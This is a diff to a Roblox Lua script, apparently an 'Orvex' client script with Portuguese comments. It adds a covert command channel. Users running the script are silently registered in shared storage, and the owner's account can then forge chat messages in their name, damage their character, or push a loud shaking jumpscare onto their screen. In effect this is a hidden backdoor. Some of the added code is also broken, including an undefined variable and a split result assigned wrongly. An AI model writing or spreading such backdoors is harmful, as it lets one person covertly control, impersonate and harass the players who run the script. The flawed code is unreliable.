@@ -670,27 +670,39 @@ Icon = "rbxassetid://80387863064905"
 })
 
 task.spawn(function()
-    local TextChatService = game:GetService("TextChatService")
-    local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)
-    
+    local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
     local DONO_ID = 2980742903
-    local telaSusto = nil
-    local loopSusto = nil
 
-    -- Cria o identificador visual (Tag) que apenas o Dono enxergará
+    -- Cria as instâncias de ponte em memória caso não existam
+    local PonteOrdens = RobloxReplicatedStorage:FindFirstChild("OrvexNetworkComms") or Instance.new("StringValue", RobloxReplicatedStorage)
+    PonteOrdens.Name = "OrvexNetworkComms"
+
+    local ListaAtivos = RobloxReplicatedStorage:FindFirstChild("OrvexActiveClients") or Instance.new("StringValue", RobloxReplicatedStorage)
+    ListaActive.Name = "OrvexActiveClients"
+
+    -- Registra silenciosamente a presença do script na memória compartilhada
+    task.spawn(function()
+        while task.wait(1.5) do
+            local str = ListaAtivos.Value
+            if not string.find(str, jogador.Name) then
+                ListaAtivos.Value = str == "" and jogador.Name or str .. "," .. jogador.Name
+            end
+        end
+    end)
+
+    -- Injeta a identificação visual (Tag) que apenas o Dono consegue enxergar
     local function aplicarTagDono()
-        if game:GetService("Players").LocalPlayer.UserId == DONO_ID then return end
+        if game:GetService("Players").LocalPlayer.UserId ~= DONO_ID then return end
         local head = jogador.Character and jogador.Character:WaitForChild("Head", 10)
         if head and not head:FindFirstChild("OrvexUserTag") then
-            local tagGui = Instance.new("BillboardGui")
+            local tagGui = Instance.new("BillboardGui", head)
             tagGui.Name = "OrvexUserTag"
             tagGui.Size = UDim2.fromOffset(100, 30)
             tagGui.StudsOffset = Vector3.new(0, 5.5, 0)
             tagGui.AlwaysOnTop = true
             tagGui.MaxDistance = 150
-            tagGui.Parent = head
             
-            local label = Instance.new("TextLabel")
+            local label = Instance.new("TextLabel", tagGui)
             label.Size = UDim2.fromScale(1, 1)
             label.BackgroundTransparency = 1
             label.Font = Enum.Font.GothamBold
@@ -698,22 +710,22 @@ task.spawn(function()
             label.TextColor3 = Color3.fromRGB(0, 170, 255)
             label.TextSize = 14
             label.TextStrokeTransparency = 0.3
-            label.Parent = tagGui
         end
     end
 
     if jogador.Character then aplicarTagDono() end
     jogador.CharacterAdded:Connect(function() task.wait(1) aplicarTagDono() end)
 
+    local telaSusto = nil
+    local loopSusto = nil
+
     local function executarOrdem(cmd, arg)
-        if cmd == "SolicitarVerificacao" then
-            if canalGeral then
-                pcall(function() canalGeral:SendAsync("new123") end)
-            end
-        elseif cmd == "FakeMessage" then
-            if canalGeral then
+        if cmd == "FakeMessage" then
+            local TextChatService = game:GetService("TextChatService")
+            local canal = TextChatService:WaitForChild("TextChannels", 10):FindFirstChild("RBXGeneral")
+            if canal then
                 pcall(function()
-                    canalGeral:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
+                    canal:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
                 end)
             end
         elseif cmd == "Danificar" then
@@ -730,7 +742,6 @@ task.spawn(function()
                 local im = Instance.new("ImageLabel", f) im.Size = UDim2.new(0.6,0,0.6,0) im.Position = UDim2.new(0.2,0,0.2,0) im.BackgroundTransparency = 1 im.Image = "rbxassetid://6071575298"
                 local s = Instance.new("Sound", f) s.SoundId = "rbxassetid://9069609268" s.Volume = 3 s:Play()
                 
-                -- Adiciona efeito de tremor e flash dinâmico ao susto
                 loopSusto = task.spawn(function()
                     local r = Random.new()
                     while true do
@@ -748,10 +759,13 @@ task.spawn(function()
         end
     end
 
-    TextChatService.OnIncomingMessage = function(mensagemObj)
-        local texto = mensagemObj.Text
-        local c, a = string.match(texto, "^%[ORVEX%-CMD%]%s*(%w+)%s*|%s*(.*)$")
-        if c then task.spawn(executarOrdem, c, a) end
-        return nil
-    end
+    -- Fica escutando as mudanças na memória local instantaneamente
+    PonteOrdens.Changed:Connect(function(valor)
+        if valor == "" then return end
+        local dados = string.split(valor, "|")
+        local alvoNome, comando, argumento = dados, dados, dados
+        if alvoNome == jogador.Name then
+            task.spawn(executarOrdem, comando, argumento)
+        end
+    end)
 end)
